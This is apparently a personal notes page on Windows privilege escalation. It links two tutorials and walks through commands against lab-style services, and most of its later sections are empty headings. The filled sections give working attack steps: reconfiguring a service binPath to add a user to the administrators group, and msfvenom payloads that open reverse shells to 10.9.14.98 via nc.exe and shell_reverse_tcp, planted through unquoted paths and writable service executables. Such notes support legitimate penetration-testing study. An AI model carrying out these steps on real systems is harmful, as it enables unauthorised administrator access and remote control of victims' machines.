For Windows Priviledge Escalation guide you can follow these two posts:


1-https://www.fuzzysecurity.com/tutorials/16.html


2-https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/


HERE'S HOW I APPROACH FOR ESCALATING PRIVILEDGES:

![Windows_priv_esc_password_credentials](https://user-images.githubusercontent.com/55708909/92549895-fb567a00-f277-11ea-947d-8929d12b723d.png)


1- Services (binpath):
-----------------------------------------------------------------------
         First transfer the accesschk64.exe to system 
   
         Run accesschk64.exe -accepteula
   
         Run accesschk64.exe -wvuc "Service name"       accesschk64.exe -wvuc daclsvc
   
   ![Service(BIn_Path)](https://user-images.githubusercontent.com/55708909/92556310-390ecf00-f287-11ea-8a85-1af55670e7aa.png)

          You will see that everyone has read and write permission to change SERVICE_CHANGE_CONFIG
          
          Write this: sc config daclsvc binPath= "net localgroup administrators user /add"
          
          Then write this : sc start daclsvc 
          
          You will be added to admin group 

![Service(BIn_Path_1)](https://user-images.githubusercontent.com/55708909/92556850-8c355180-f288-11ea-982b-b02fd5864ca2.png)


2- Services (Unquoted path):
---------------------------------------------------------------------------------------
          For it to work we need to identify which are the path which are not included in quotes
          
          wmic service get name,pathname,startmode | findstr /i /v "c:\windows\\" | findstr /i /v """
          
 ![Service(Unquoted_path)](https://user-images.githubusercontent.com/55708909/92557524-05817400-f28a-11ea-9d03-b9f21efc8826.png)

          First transfer nc.exe to C:\Users\user directory
          
          msfvenom -p windows/exec CMD="C:\Users\user\nc.exe 10.9.14.98 443 -e cmd.exe" -f exe-service > common.exe
          
          Transfer the common.exe to C:\Program Files\Unquoted Path Service
          
          type sc start unquotedsvc
          
 ![Service(Unquoted_path_1)](https://user-images.githubusercontent.com/55708909/92558713-c3a5fd00-f28c-11ea-9423-fe436ac65491.png)
         
          

3- Service (Registry):
-------------------------------------------------------------------------------------------

4- Services( Executable files):
---------------------------------------------------------------------------------------------
          
           Transfer the accesschk.exe to pc and check for weak executable service
           
![Service(Executable)](https://user-images.githubusercontent.com/55708909/92559368-1a600680-f28e-11ea-940d-2472ece84622.png)
 
            We notice that everyone has read and write access to filepermservice.exe
            
            msfvenom -p windows/shell_reverse_tcp LHOST=10.9.14.98 LPORT=4444 -f exe > filepermservice.exe
            
            transfer filepermservice.exe to target system
            
            copy /y filepermservice.exe "C:\Program Files\File Permissions Service"

            sc start filepermsvc 
            
![Service(Executable_1)](https://user-images.githubusercontent.com/55708909/92560004-45972580-f28f-11ea-88fd-f5c365dd41ef.png)

           
5- Registry (Always installed elevated):
---------------------------------------------------------------------------------------------

6- Registry (Modified autorun): Need to have admin login to work
-------------------------------------------------------------------------------------------------

7- Password minig (Registry):
-------------------------------------------------------------------------------------------

8- Password mining (Memory)
-----------------------------------------------------------------------------------------

9- Password mining (Configuration Files):
------------------------------------------------------------------------------------------

10- Scheduled tasks (Missing binary):
------------------------------------------------------------------------------------------

11- Startup applications:
--------------------------------------------------------------------------------------------

12- Potato attacks:
--------------------------------------------------------------------------------------------

13- DLL Hijacking:
----------------------------------------------------------------------------------------------

14-Kernel exploits:
----------------------------------------------------------------------------------------------
